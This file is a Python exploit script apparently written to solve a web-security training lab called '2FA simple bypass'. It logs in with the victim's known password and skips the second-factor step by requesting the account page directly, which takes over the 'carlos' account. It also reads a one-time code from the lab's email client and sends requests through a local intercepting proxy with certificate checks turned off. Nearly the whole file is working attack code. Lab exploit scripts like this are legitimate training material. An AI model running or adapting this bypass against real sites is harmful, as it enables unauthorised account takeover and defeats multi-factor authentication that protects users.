# 2FA simple bypass

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def connect_as_wiener(s, url, attacker):
	login_path = url + '/login'
	time.sleep(1)
	data_login = {'username': 'wiener', 'password': 'peter'}
	print('\n[+] Trying to connect to the application as Wiener...')
	r = s.post(login_path, data=data_login)
	time.sleep(1)
	r = s.get('https://' + attacker + '/email')
	if re.search(r'Your security code is (\w+).', r.text):
		code = re.search(r'Your security code is (\w+).', r.text).group(1)
		print('[+] Found security code: \t%s' % code)
	else:
		print('[-] Exploit failed to retrieve the MFA code <!>')
		sys.exit(1)
	login2_path = url + '/login2'
	data_login2 = {'mfa-code': code}
	r = s.post(login2_path, data=data_login2)
	if 'Your username is: wiener' in r.text:
		print('[+] Logged in as Wiener !')
		return r
	else:
		print('[-] Exploit failed to connect as Wiener <!>')
		sys.exit(1)

def connect_as_carlos(s, url):
	login_path = url + '/login'
	time.sleep(1)
	data_login = {'username': 'carlos', 'password': 'montoya'}
	print('\n[+] Trying to connect to the application as Carlos...')
	r = s.post(login_path, data=data_login)
	time.sleep(1)
	print('[+] Trying to bypass the MFA verification...')
	account_path = url + '/my-account'
	print('[+] Navigating to "%s"' % account_path)
	r = s.get(account_path)
	if 'Your username is: carlos' in r.text:
		print('[+] Logged in as Carlos !')
		return r
	else:
		print('[-] Exploit failed to connect as Carlos <!>')

def find_exploit_srv(r):
	if re.search(r"href='(.*)'>Email client", r.text):
		srv = re.search(r"href='(.*)'>Email client", r.text).group(1)
		print('[+] Found Exploir server:\n\t%s' % srv)
		return srv

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: 2FA simple bypass')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		exploit_srv = find_exploit_srv(r)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying to find a way to bypass 2FA to access Carlos account...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			attacker = urllib.parse.urlparse(exploit_srv).netloc
			r = connect_as_wiener(s, url, attacker)
			s.cookies.clear()
			time.sleep(2)
			r = connect_as_carlos(s, url)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
